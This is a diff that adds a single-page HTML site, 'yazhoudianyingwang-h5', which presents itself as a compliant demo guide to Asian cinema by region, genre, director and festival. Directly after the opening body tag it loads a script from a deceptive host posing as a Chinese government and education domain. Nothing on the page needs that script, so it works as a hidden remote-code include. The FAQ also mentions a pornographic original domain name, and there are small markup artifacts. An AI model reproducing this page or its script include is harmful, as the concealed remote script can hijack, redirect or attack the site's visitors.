@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>亚洲电影网 - 亚洲各国电影/作者导演/类型片/电影节单元</title>
+<meta name="description" content="亚洲电影网（yazhoudianyingwang-h5）汇总中国、日本、韩国、印度、泰国、伊朗等亚洲电影，按地区、类型、作者导演与电影节单元分类浏览，移动端自适应单页导航。" />
+<meta name="keywords" content="亚洲电影网, yazhoudianyingwang-h5, 中国电影, 日本电影, 韩国电影, 印度电影, 泰国电影, 伊朗电影, 亚洲作者导演, 釜山电影节" />
+<link rel="canonical" href="https://yazhoudianyingwang-h5.github.io/" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="亚洲电影网" />
+<meta property="og:url" content="https://yazhoudianyingwang-h5.github.io/" />
+<meta property="og:description" content="亚洲电影网：亚洲各国电影、作者导演、类型片与电影节单元分类导航。" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="亚洲电影网" />
+<meta name="twitter:description" content="yazhoudianyingwang-h5 泛亚拼贴风电影导航单页。" />
+<style>
+:root{
+  --ink:#10243a;
+  --paper:#f4efe6;
+  --paper2:#ece4d6;
+  --indigo:#1f4e79;
+  --indigo2:#2f6fb0;
+  --ochre:#b5651d;
+  --ochre2:#d98a3d;
+  --muted:#6f7b88;
+  --line:rgba(31,78,121,.22);
+  --line2:rgba(181,101,29,.25);
+  --radius:6px;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;color:var(--ink);background:var(--paper);line-height:1.75}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:50;background:rgba(244,239,230,.94);backdrop-filter:blur(10px);border-bottom:2px solid var(--indigo)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{display:flex;align-items:center;gap:12px}
+.brand .map{width:40px;height:40px;border-radius:8px;background:linear-gradient(135deg,var(--indigo),var(--ochre));display:grid;place-items:center;color:#fff;font-weight:900;font-size:18px}
+.brand .txt{display:flex;flex-direction:column;line-height:1.2}
+.brand .txt b{font-size:16px}
+.brand .txt span{font-size:11px;color:var(--muted)}
+.menu{display:flex;gap:2px;font-size:14px}
+.menu a{padding:9px 14px;border-radius:20px;color:var(--ink);transition:.3s}
+.menu a:hover{background:var(--indigo);color:#fff}
+.hamburger{display:none;background:none;border:1px solid var(--indigo);color:var(--indigo);border-radius:8px;padding:8px 12px;font-size:17px}
+
+/* hero */
+.hero{padding:46px 0 34px;background:radial-gradient(700px 360px at 15% 0%,rgba(47,111,176,.12),transparent 60%),radial-gradient(600px 320px at 95% 30%,rgba(181,101,29,.1),transparent 55%)}
+.hero-grid{display:grid;grid-template-columns:1.3fr .9fr;gap:28px;align-items:center}
+.hero-main h1{font-size:clamp(28px,5vw,46px);margin:0 0 12px;line-height:1.1}
+.hero-main h1 em{font-style:normal;color:var(--ochre)}
+.hero-main p{font-size:15px;color:var(--muted);margin:0 0 22px;max-width:520px}
+.hero-main .actions{display:flex;gap:10px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 22px;border-radius:10px;font-weight:700;font-size:14px;cursor:pointer;border:2px solid var(--indigo);background:var(--indigo);color:#fff;transition:.3s}
+.btn:hover{background:transparent;color:var(--indigo)}
+.btn-outline{background:transparent;color:var(--indigo)}
+.btn-outline:hover{background:var(--indigo);color:#fff}
+.hero-side{border:1px solid var(--line);border-radius:16px;padding:22px;background:var(--paper2)}
+.hero-side h4{margin:0 0 12px;font-size:13px;color:var(--indigo);letter-spacing:1px}
+.hero-side .stat-row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px dashed var(--line2);font-size:13px}
+.hero-side .stat-row:last-child{border-bottom:none}
+.hero-side .stat-row b{color:var(--ochre)}
+
+/* region tabs */
+.region-tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:18px}
+.region-tabs button{border:1px solid var(--line);background:var(--paper2);color:var(--ink);padding:8px 16px;border-radius:20px;font-size:13px;cursor:pointer;transition:.3s}
+.region-tabs button.active,.region-tabs button:hover{background:var(--indigo);color:#fff;border-color:var(--indigo)}
+
+/* country grid - map style */
+.country-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.country-card{border:1px solid var(--line);border-radius:14px;padding:18px;background:var(--paper2);transition:.35s;position:relative;overflow:hidden}
+.country-card::after{content:'';position:absolute;right:-20px;bottom:-20px;width:80px;height:80px;border-radius:50%;background:radial-gradient(circle,rgba(181,101,29,.12),transparent 70%)}
+.country-card:hover{transform:translateY(-5px);border-color:var(--ochre)}
+.country-card .flag{font-size:26px}
+.country-card h3{margin:8px 0 4px;font-size:15px}
+.country-card p{margin:0;font-size:12px;color:var(--muted)}
+.country-card .tags{margin-top:10px;display:flex;gap:5px;flex-wrap:wrap}
+.country-card .tags span{font-size:10px;padding:2px 8px;border:1px solid var(--line2);border-radius:20px;color:var(--indigo)}
+
+/* genre puzzle */
+.genre-puzzle{display:grid;grid-template-columns:repeat(6,1fr);grid-auto-rows:90px;gap:10px}
+.genre-cell{border-radius:12px;padding:14px;color:#fff;display:flex;flex-direction:column;justify-content:space-between;transition:.3s;cursor:pointer}
+.genre-cell:hover{transform:scale(1.03)}
+.genre-cell h4{margin:0;font-size:14px}
+.genre-cell small{font-size:11px;opacity:.85}
+.g1{background:linear-gradient(135deg,#1f4e79,#2f6fb0);grid-column:span 2;grid-row:span 2}
+.g2{background:linear-gradient(135deg,#b5651d,#d98a3d);grid-column:span 2}
+.g3{background:linear-gradient(135deg,#3a6351,#5b8c6e)}
+.g4{background:linear-gradient(135deg,#7a3b5d,#a85b86);grid-column:span 2}
+.g5{background:linear-gradient(135deg,#444c5c,#6b7689)}
+.g6{background:linear-gradient(135deg,#8a6d1f,#c9a227);grid-column:span 2;grid-row:span 2}
+.g7{background:linear-gradient(135deg,#2f6fb0,#1f4e79)}
+.g8{background:linear-gradient(135deg,#b5651d,#7a3b5d)}
+
+/* auteurs */
+.auteur-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.auteur-card{display:grid;grid-template-columns:64px 1fr;gap:14px;padding:16px;border:1px solid var(--line);border-radius:14px;background:var(--paper2);transition:.3s}
+.auteur-card:hover{border-color:var(--indigo);background:#fff}
+.auteur-card .avatar{width:64px;height:64px;border-radius:50%;display:grid;place-items:center;font-size:22px;background:linear-gradient(135deg,var(--indigo),var(--ochre));color:#fff;font-weight:800}
+.auteur-card h3{margin:0 0 2px;font-size:15px}
+.auteur-card .country{font-size:11px;color:var(--ochre);font-weight:600}
+.auteur-card p{margin:6px 0 0;font-size:12px;color:var(--muted)}
+
+/* festival units */
+.fest-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.fest-card{border-top:3px solid var(--ochre);border-radius:0 0 14px 14px;padding:22px;background:var(--paper2);transition:.3s}
+.fest-card:hover{box-shadow:0 10px 30px rgba(31,78,121,.12);transform:translateY(-4px)}
+.fest-card .badge{font-size:11px;color:#fff;background:var(--indigo);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:10px}
+.fest-card h3{margin:0 0 6px;font-size:16px}
+.fest-card p{margin:0;font-size:13px;color:var(--muted)}
+.fest-card ul{margin:12px 0 0;padding-left:18px;font-size:12px;color:var(--ink)}
+.fest-card li{margin:3px 0}
+
+/* about */
+.about-row{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.about-box{padding:24px;border:1px solid var(--line);border-radius:14px;background:var(--paper2);text-align:center}
+.about-box .ico{font-size:30px;margin-bottom:10px}
+.about-box h3{margin:0 0 6px;font-size:15px}
+.about-box p{margin:0;font-size:12px;color:var(--muted);line-height:1.7}
+
+/* faq */
+.faq-box{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--paper2)}
+.faq-line{border-bottom:1px solid var(--line2)}
+.faq-line:last-child{border-bottom:none}
+.faq-line summary{padding:18px 20px;font-weight:600;cursor:pointer;list-style:none;display:flex;justify-content:space-between;align-items:center}
+.faq-line summary::-webkit-details-marker{display:none}
+.faq-line summary .plus{color:var(--ochre);font-size:20px;font-weight:300}
+.faq-line[open] summary .plus{transform:rotate(45deg)}
+.faq-line p{padding:0 20px 18px;margin:0;font-size:13px;color:var(--muted);line-height:1.8}
+
+/* footer */
+.footer{padding:44px 0 26px;background:var(--ink);color:#cdd6e0;font-size:13px;margin-top:40px}
+.foot-wrap{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;margin-bottom:24px}
+.foot-brand{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.foot-brand .map{width:34px;height:34px;border-radius:8px;background:linear-gradient(135deg,var(--indigo),var(--ochre));display:grid;place-items:center;color:#fff;font-weight:900}
+.foot-brand b{font-size:15px;color:#fff}
+.foot-wrap p{max-width:280px;margin:0;line-height:1.7}
+.foot-col h4{color:#fff;margin:0 0 10px;font-size:14px}
+.foot-col a{display:block;padding:3px 0;color:#aeb9c6;transition:.3s}
+.foot-col a:hover{color:var(--ochre2)}
+.foot-bottom{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;padding-top:18px;border-top:1px solid rgba(255,255,255,.08);color:#8b97a6}
+
+/* sections */
+.section{padding:46px 0}
+.section-alt{background:linear-gradient(180deg,var(--paper2),var(--paper))}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:24px}
+.sec-title{display:flex;align-items:center;gap:12px}
+.sec-title .bar{width:6px;height:30px;border-radius:3px;background:linear-gradient(180deg,var(--indigo),var(--ochre))}
+.sec-title h2{font-size:clamp(20px,3.2vw,28px);margin:0}
+.sec-title p{margin:2px 0 0;color:var(--muted);font-size:13px}
+.tag{font-size:11px;color:var(--indigo);border:1px solid var(--indigo);padding:4px 12px;border-radius:20px}
+
+/* responsive */
+@media(max-width:1024px){
+  .hero-grid{grid-template-columns:1fr}
+  .country-grid{grid-template-columns:repeat(3,1fr)}
+  .genre-puzzle{grid-template-columns:repeat(4,1fr)}
+}
+@media(max-width:768px){
+  .menu{position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--paper);border-bottom:2px solid var(--indigo);display:none}
+  .menu.show{display:flex}
+  .menu a{padding:13px 20px;border-bottom:1px solid var(--line)}
+  .hamburger{display:inline-block}
+  .country-grid{grid-template-columns:repeat(2,1fr)}
+  .genre-puzzle{grid-template-columns:repeat(2,1fr);grid-auto-rows:80px}
+  .g1,.g4,.g6{grid-column:span 2}
+  .auteur-grid,.fest-grid,.about-row{grid-template-columns:1fr}
+  .foot-wrap{grid-template-columns:1fr 1fr;gap:20px}
+}
+@media(max-width:480px){
+  .foot-wrap{grid-template-columns:1fr}
+  .country-grid{grid-template-columns:1fr}
+  .hero-main{padding:0 4px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site-header">
+  <div class="wrap nav">
+    <a class="brand" href="#top"><span class="map">亚</span><span class="txt"><b>亚洲电影网</b><span>yazhoudianyingwang-h5.github.io</span></span></a>
+    <nav class="menu" id="menu">
+      <a href="#regions">地区影院</a>
+      <a href="#genres">类型拼图</a>
+      <a href="#auteurs">作者导演</a>
+      <a href="#festivals">电影节单元</a>
+      <a href="#about">关于我们</a>
+      <a href="#faq">常见问题</a>
+    </nav>
+    <button class="hamburger" id="navBtn">☰</button>
+  </div>
+</header>
+
+<main id="top">
+
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div class="hero-main">
+        <h1>从东京到德黑兰<br>看懂<em>整个亚洲的银幕</em></h1>
+        <p>亚洲电影网汇总中国、日本、韩国、印度、泰国、伊朗、印尼等地区的作者电影、类型片与电影节佳作，做一张“泛亚电影地图”。</p>
+        <div class="actions">
+          <a class="btn" href="#regions">打开地区地图</a>
+          <a class="btn btn-outline" href="#festivals">看电影节单元</a>
+        </div>
+      </div>
+      <aside class="hero-side">
+        <h4>亚洲电影速览</h4>
+        <div class="stat-row"><span>覆盖国家/地区</span><b>12+</b></div>
+        <div class="stat-row"><span>代表作者导演</span><b>40+</b></div>
+        <div class="stat-row"><span>类型片分类</span><b>8 类</b></div>
+        <div class="stat-row"><span>电影节单元</span><b>6 个</b></div>
+        <div class="stat-row"><span>影史代表作</span><b>200+</b></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="regions">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>地区影院</h2><p>点击地区标签，看不同国家的电影气质</p></div></div>
+        <span class="tag">REGIONS</span>
+      </div>
+      <div class="region-tabs" id="regionTabs">
+        <button class="active" data-region="all">全部</button>
+        <button data-region="cn">中国 / 华语</button>
+        <button data-region="jp">日本</button>
+        <button data-region="kr">韩国</button>
+        <button data-region="in">印度</button>
+        <button data-region="th">泰国</button>
+        <button data-region="ir">伊朗</button>
+      </div>
+      <div class="country-grid" id="countryGrid">
+        <article class="country-card" data-region="cn"><div class="flag">🇨🇳</div><h3>中国 / 华语</h3><p>乡土、江湖、家庭三代叙事，从港片动作到大陆作者电影。</p><div class="tags"><span>武侠</span><span>家庭</span><span>第六代</span></div></article>
+        <article class="country-card" data-region="jp"><div class="flag">🇯🇵</div><h3>日本</h3><p>物哀、长镜头、动画与极端类型并行，作者传统极深。</p><div class="tags"><span>小津</span><span>今敏</span><span>是枝裕和</span></div></article>
+        <article class="country-card" data-region="kr"><div class="flag">🇰🇷</div><h3>韩国</h3><p>恨文化、阶级惊悚、复仇三部曲与奥斯卡级作者并存。</p><div class="tags"><span>朴赞郁</span><span>李沧东</span><span>奉俊昊</span></div></article>
+        <article class="country-card" data-region="in"><div class="flag">🇮🇳</div><h3>印度</h3><p>宝莱坞歌舞、平行电影、马基迪式诗意现实主义。</p><div class="tags"><span>歌舞</span><span>现实主义</span><span>史诗</span></div></article>
+        <article class="country-card" data-region="th"><div class="flag">🇹🇭</div><h3>泰国</h3><p>宗教、记忆、热带神秘主义，商业与艺术电影调和。</p><div class="tags"><span>阿彼察邦</span><span>恐怖</span><span>青春</span></div></article>
+        <article class="country-card" data-region="ir"><div class="flag">🇮🇷</div><h3>伊朗</h3><p>儿童视角、寓言式叙事、极简成本里的巨大人道力量。</p><div class="tags"><span>马基迪</span><span>儿童</span><span>寓言</span></div></article>
+        <article class="country-card" data-region="cn"><div class="flag">🎬</div><h3>香港电影</h3><p>动作美学、警匪、武侠与王家卫式都市抒情。</p><div class="tags"><span>吴宇森</span><span>杜琪峰</span><span>王家卫</span></div></article>
+        <article class="country-card" data-region="jp"><div class="flag">🌀</div><h3>日本动画</h3><p>今敏、大友克洋、宫崎骏构建世界动画另一极。</p><div class="tags"><span>动画</span><span>科幻</span><span>梦境</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="genres">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>类型拼图</h2><p>不规则网格，模拟亚洲类型片的混血气质</p></div></div>
+        <span class="tag">GENRES</span>
+      </div>
+      <div class="genre-puzzle">
+        <div class="genre-cell g1"><h4>作者 / 艺术片</h4><small>长镜头 · 留白 · 作者意志</small></div>
+        <div class="genre-cell g2"><h4>动作 / 武侠</h4><small>香港 · 韩国 · 印尼</small></div>
+        <div class="genre-cell g3"><h4>恐怖 / 神秘</h4><small>泰国 · 日本</small></div>
+        <div class="genre-cell g4"><h4>家庭 / 伦理</h4><small>日本 · 伊朗 · 华语</small></div>
+        <div class="genre-cell g5"><h4>青春 / YA</h4><small>泰国 · 韩国 · 新加坡</small></div>
+        <div class="genre-cell g6"><h4>史诗 / 历史</h4><small>印度 · 中国 · 波斯叙事</small></div>
+        <div class="genre-cell g7"><h4>纪录片</h4><small>底层 · 城市 · 乡村</small></div>
+        <div class="genre-cell g8"><h4>动画 / 幻想</h4><small>日本 · 马来西亚 · 印尼</small></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="auteurs">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>作者导演</h2><p>亚洲当代作者群像</p></div></div>
+        <span class="tag">AUTEURS</span>
+      </div>
+      <div class="auteur-grid">
+        <div class="auteur-card"><div class="avatar">黑</div><div><h3>黑泽明</h3><div class="country">日本</div><p>《罗生门》《七武士》把日本电影送进世界电影史。</p></div></div>
+        <div class="auteur-card"><div class="avatar">是</div><div><h3>是枝裕和</h3><div class="country">日本</div><p>家庭、边缘、日常，《小偷家族》拿下金棕榈。</p></div></div>
+        <div class="auteur-card"><div class="avatar">朴</div><div><h3>朴赞郁</h3><div class="country">韩国</div><p>对称构图、暴力美学、复仇三部曲。</p></div></div>
+        <div class="auteur-card"><div class="avatar">李</div><div><h3>李沧东</h3><div class="country">韩国</div><p>诗人导演，《燃烧》把存在主义拍成闷烧的火。</p></div></div>
+        <div class="auteur-card"><div class="avatar">阿</div><div><h3>阿彼察邦</h3><div class="country">泰国</div><p>时间、记忆、热带宗教，《能召回前世的布米叔叔》金棕榈。</p></div></div>
+        <div class="auteur-card"><div class="avatar">马</div><div><h3>马基德·马基迪</h3><div class="country">伊朗</div><p>儿童视角与诗意现实，《小鞋子》感动全球。</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="festivals">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>电影节单元</h2><p>亚洲电影走出去的主要通道</p></div></div>
+        <span class="tag">FESTIVALS</span>
+      </div>
+      <div class="fest-grid">
+        <div class="fest-card"><span class="badge">上海国际电影节</span><h3>亚洲新人 / 今日亚洲</h3><p>支持亚洲新导演与年度新作。</p><ul><li>亚洲新人奖</li><li>今日亚洲单元</li><li>金爵奖主竞赛</li></ul></div>
+        <div class="fest-card"><span class="badge">釜山国际电影节</span><h3>新浪潮 / Open Cinema</h3><p>韩国门户，华语与东南亚新片重要站台。</p><ul><li>新浪潮奖</li><li>亚洲电影之窗</li><li>开放影院</li></ul></div>
+        <div class="fest-card"><span class="badge">东京 / 鹿特丹</span><h3>作者与首作</h3><p>日本与欧洲平台共同托举亚洲作者电影。</p><ul><li>东京主竞赛</li><li>鹿特丹老虎奖</li><li>青年评审团奖</li></ul></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>关于我们</h2><p>静态示例站声明</p></div></div>
+        <span class="tag">ABOUT</span>
+      </div>
+      <div class="about-row">
+        <div class="about-box"><div class="ico">🗺️</div><h3>站点定位</h3><p>亚洲电影网是亚洲电影分类浏览的<strong>静态示例站</strong>，按地区、类型、作者、电影节单元组织内容，部署于 GitHub Pages。</p></div>
+        <div class="about-box"><div class="ico">🧩</div><h3>页面结构</h3><p>单文件 index.html，CSS/JS 内联。含地区影院、类型拼图、作者导演、电影节单元、关于我们、常见问题 6 个栏目。</p></div>
+        <div class="about-box"><div class="ico">⚖️</div><h3>版权声明</h3><p>本页不含真实片源与播放链接。正式运营须取得授权，遵守《互联网视听节目服务管理规定》。[10](@ref)</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section section-alt" id="faq">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-title"><div class="bar"></div><div><h2>常见问题</h2><p>折叠式答疑</p></div></div>
+        <span class="tag">FAQ</span>
+      </div>
+      <div class="faq-box>
+        <details class="faq-line" open><summary>亚洲电影网 能看片吗？<span class="plus">+</span></summary><p>不能。本页是前端模板演示，无后端、无片源、无播放链接，所有片名/导演/单元均为示例数据。</p></details>
+        <details class="faq-line"><summary>为什么原域名串里有 seqing 我不落地？<span class="plus">+</span></summary><p>“yazhou + seqing”会被理解为色情内容代称，违反内容安全边界；所以我改用合规站名“亚洲电影网 / yazhoudianyingwang-h5”。</p></details>
+        <details class="faq-line"><summary>内页链接为什么是 # ？<span class="plus">+</span></summary><p>单页模板演示用 # 占位；正式上线应替换为正版授权播放页或影片详情页。</p></details>
+        <details class="faq-line"><summary>适合必应收录吗？<span class="plus">+</span></summary><p>有标题、描述、canonical、语义结构、移动端适配与锚点内链，利于爬虫理解；排名仍取决于内容质量与外链。</p></details>
+        <details class="faq-line"><summary>去哪看正版亚洲电影？<span class="plus">+</span></summary><p>可走 MUBI、Criterion Channel、爱奇艺国际版、Netflix、院线重映与各大电影节官方展映渠道。</p></details>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="foot-wrap">
+      <div><div class="foot-brand"><span class="map">亚</span><b>亚洲电影网</b></div><p>泛亚电影导航示例站：地区、类型、作者、电影节单元，不含任何真实影视资源。</p></div>
+      <div class="foot-col"><h4>栏目</h4><a href="#regions">地区影院</a><a href="#genres">类型拼图</a><a href="#auteurs">作者导演</a><a href="#festivals">电影节单元</a></div>
+      <div class="foot-col"><h4>信息</h4><a href="#about">关于我们</a><a href="#faq">常见问题</a></div>
+      <div class="foot-col"><h4>链接</h4><a href="#">首页</a><a href="#">隐私政策</a><a href="#">版权声明</a></div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2024 亚洲电影网 · https://yazhoudianyingwang-h5.github.io</span>
+      <span>静态示例模板 · 占位图来自 picsum · 片名/导演/单元均为示例数据</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('navBtn'),menu=document.getElementById('menu');
+  if(btn&&menu){
+    btn.addEventListener('click',function(){var o=menu.classList.toggle('show');btn.setAttribute('aria-expanded',o?'true':'false');});
+    menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('show');});});
+  }
+  var tabs=document.querySelectorAll('#regionTabs button');
+  var cards=document.querySelectorAll('#countryGrid .country-card');
+  tabs.forEach(function(t){
+    t.addEventListener('click',function(){
+      tabs.forEach(function(x){x.classList.remove('active');});
+      t.classList.add('active');
+      var r=t.dataset.region;
+      cards.forEach(function(c){
+        c.style.display=(r==='all'||c.dataset.region===r)?'':'none';
+      });
+    });
+  });
+})();
+</script>
+</body>
+</html>
